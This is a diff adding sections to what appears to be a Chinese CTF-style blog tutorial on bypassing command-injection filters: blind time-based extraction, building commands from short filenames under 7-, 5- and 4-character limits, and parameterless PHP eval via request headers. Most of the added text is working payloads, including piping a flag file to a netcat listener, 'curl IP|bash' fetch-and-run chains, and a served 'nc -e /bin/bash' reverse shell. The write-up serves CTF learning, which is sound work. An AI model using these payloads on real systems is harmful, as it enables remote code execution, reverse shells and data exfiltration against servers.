@@ -246,6 +246,53 @@
 <p><code>tac flag.php-&gt;74616320666c61672e706870</code><br>&#96;&#96;#echo “74616320666c61672e706870” | xxd -r-p | bash&#96;</p>
 <h3 id="4-shellcode编码-16进制机器码"><a href="#4-shellcode编码-16进制机器码" class="headerlink" title="4.shellcode编码(16进制机器码)"></a>4.shellcode编码(16进制机器码)</h3><p>当服务器没装xxd可以用</p>
 <p><code>tac flag.php -&gt;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</code>也就是把ascii每两个之前加\x</p>
+<h2 id="十、无回显时间盲注"><a href="#十、无回显时间盲注" class="headerlink" title="十、无回显时间盲注"></a>十、无回显时间盲注</h2><p>适用条件：页面无法反弹shell，无回显，没有写入权限</p>
+<p>原理：根据返回时间来判断（时间盲注）</p>
+<p>函数：sleep 1 -&gt; 睡眠一秒<br>awk NR:逐行读取	cat flag.php | awk NR=&#x3D;1读取第一行<br>cut -c:读取第几个字符	cat flag.php | awk NR&#x3D;&#x3D;1 | cut -c 1读取第一行第一个字符<br>if [ ];then 条件为真执行;fi	finish表示条件为假什么也不执行,注意if之后必须有空格<code>if [2&gt;1];then echo &#39;right;fi&#39;</code></p>
+<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png"></p>
+<p>$()执行语句,字母不用加引号<br>时间盲注：<code>#if [$(cat flag |awk NR==2|cut -c 1)== F ];then sleep 2;fi</code></p>
+<h2 id="十一、长度过滤绕过"><a href="#十一、长度过滤绕过" class="headerlink" title="十一、长度过滤绕过"></a>十一、长度过滤绕过</h2><h3 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h3><p>1.&gt; <code>echo &quot;benben&quot; &gt; a</code>创建a文件，再次创建会覆盖	touch a为创建一个空文件a<br>2.&gt;&gt; <code>echo &quot;benben&quot; &gt;&gt; a</code>追加内容<br>3.\ 换行 <code>cat a等价于 c\换行a\换行 t\换行 a</code><br>4.ls -t	ls排序，按文件名排序：符号&gt;数字&gt;字符串<br>        ls -t排序，按时间顺序排序，最近&gt;最远<br>组合运用：把一些很短的文件名拼接成可执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;ag</span><br><span class="line">&gt;/fl\\ <span class="comment">#两个\\是把\实体化变为字符</span></span><br><span class="line">&gt;t\ \\ <span class="comment">#t后面要有\空格</span></span><br><span class="line">&gt;ca\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;a</span><br><span class="line"><span class="built_in">cat</span> a</span><br><span class="line">----&gt;</span><br><span class="line">ca\</span><br><span class="line">t \</span><br><span class="line">fl\</span><br><span class="line">ag <span class="comment">#也就是cat /flag</span></span><br><span class="line">----&gt;</span><br><span class="line">. a <span class="comment">#执行a: bash a or ./a or sh a</span></span><br></pre></td></tr></table></figure>
+
+<p>5.dir：基本上和ls一样 优点：开头是d，次序靠前，按列输出不换行<br>$(dir *):把第一个文件名执行，第二个以后的作为参数输出，再执行<br>6.rev flag	把flag反向输出</p>
+<h3 id="二、长度为七的绕过"><a href="#二、长度为七的绕过" class="headerlink" title="二、长度为七的绕过"></a>二、长度为七的绕过</h3><p><code>cat flag|nc 192.168.xxx.xxx 7777</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&gt;7777</span><br><span class="line">?cmd=&gt;\ \\</span><br><span class="line">?cmd=&gt;xxx\\</span><br><span class="line">?cmd=&gt;xxx.\\</span><br><span class="line">?cmd=&gt;168.\\</span><br><span class="line">?cmd=&gt;192.\\</span><br><span class="line">?cmd=&gt;c\ \\</span><br><span class="line">?cmd=&gt;\|n\\ <span class="comment">#管道符要实体化</span></span><br><span class="line">?cmd=&gt;flag\\</span><br><span class="line">?cmd=&gt;t\ \\</span><br><span class="line">?cmd=&gt;ca\\</span><br><span class="line">?cmd=<span class="built_in">ls</span> -t&gt;a<span class="comment">#刚好7字符</span></span><br><span class="line">?cmd=sh a</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、长度为五的绕过"><a href="#三、长度为五的绕过" class="headerlink" title="三、长度为五的绕过"></a>三、长度为五的绕过</h3><p>新的问题：1.ls -t&gt;a超过5个字符	2.空格&gt;\ \刚好5个字符，但是这个文件只能有一个，其他的空格无法构造</p>
+<p>解决方法：<code>curl 192.168.1.161|bash</code>，将自己开的服务器的index.html代码执行，反弹shell</p>
+<p>执行<code>nc 192.168.x.x 7777 -e /bin/bash</code></p>
+<p>步骤一：构造ls -t&gt;y</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">ls</span>\\</span><br><span class="line"><span class="comment">#因为ls的顺序会把字符串ls\放到最后导致命令顺序错误，先构造一个字符开头_的文件放进去，字符&gt;数字&gt;字符串,都有特殊字符的按时间顺序，先创建的在前</span></span><br><span class="line"><span class="built_in">ls</span>&gt;_</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y <span class="comment">#这时候的ls为&#x27;（空格）-t&gt;y _ ls\&#x27;</span></span><br><span class="line"><span class="built_in">ls</span>&gt;&gt;_ <span class="comment">#追加内容到ls\\之后，即可执行ls -t&gt;y,后面的_ ls\不影响代码执行</span></span><br></pre></td></tr></table></figure>
+
+<p>步骤二：构造curl 192.168.1.161|bash</p>
+<p>从后往前</p>
+<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png"></p>
+<p>执行代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh _ <span class="comment">#生成y,y就是所要执行的语句</span></span><br><span class="line">sh y <span class="comment">#执行语句</span></span><br></pre></td></tr></table></figure>
+
+<p>搭建一个server</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> index.html</span><br><span class="line">vim index.html <span class="comment">#输入nc 192.168.x.x 7777 -e /bin/bash</span></span><br><span class="line">python -m http.server 80 <span class="comment">#访问192.168.x.x即可</span></span><br><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>
+
+<h3 id="四、长度为四的绕过"><a href="#四、长度为四的绕过" class="headerlink" title="四、长度为四的绕过"></a>四、长度为四的绕过</h3><p>新的问题：ls&gt;&gt;_ 超过四个</p>
+<p>步骤一：构造ls -t&gt;g<br>步骤二：构造一个反弹shell curl 0xC0A801A1|bash 16进制地址</p>
+<p>*:相当于$(dir *)执行第一个文件名，后面的作为参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;<span class="built_in">dir</span> <span class="comment">#dir g&gt; sl t- 按照字母顺序排序,这样rev之后顺序不对，所以在-t后加一个h参数(显示时间)，来保证-t在中间</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改后的代码</span></span><br><span class="line">&gt;\;g <span class="comment">#这里的分号(实体化)是用来防止其他自带文件名的影响命令执行</span></span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;<span class="built_in">dir</span></span><br><span class="line">*&gt;v	<span class="comment">#执行dir命令(加了空格)，输出g&gt; ht- sl到v文件</span></span><br><span class="line"><span class="comment">#rev v 得到正向命令，但是长度大于4</span></span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x <span class="comment">#*是通配符，前能匹配rev，后能执行v,输出rev v到x,x就是正向的命令ls -th&gt;g</span></span><br></pre></td></tr></table></figure>
+
+<p>步骤二：十六进制地址编码</p>
+<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png"></p>
+<h2 id="十二、无参数命令执行"><a href="#十二、无参数命令执行" class="headerlink" title="十二、无参数命令执行"></a>十二、无参数命令执行</h2><p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"></p>
+<p>正则表达式</p>
+<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/5.png"></p>
+<p>只有a()的括号里面没有内容的时候才会执行，(?R)代表递归，a(b())嵌套也会执行</p>
+<h3 id="1-请求头绕过"><a href="#1-请求头绕过" class="headerlink" title="1.请求头绕过"></a>1.请求头绕过</h3><p>getallheaders()：获取所有http请求标头,无回显，需要用print_r()括住，与我们提交的相反</p>
+<p>php&gt;&#x3D;5.4 or php7</p>
+<p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/6.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(); <span class="comment">#取最后一行，也就是我们发送报文的第一行host</span></span><br><span class="line"><span class="title function_ invoke__">pos</span>(); <span class="comment">#取第一行，也就是我们发送报文的最后一行connection</span></span><br><span class="line"><span class="comment">#把最后一行改成想要执行的命令system(&#x27;cat flag&#x27;)</span></span><br><span class="line">?code=<span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br></pre></td></tr></table></figure>
+
+<p>可以自己创一个头</p>
+<p>可以用apache_request_headers()替换,仅当服务器是apache搭建时可用</p>
 
                 
                 <p class="end">__END__</p>
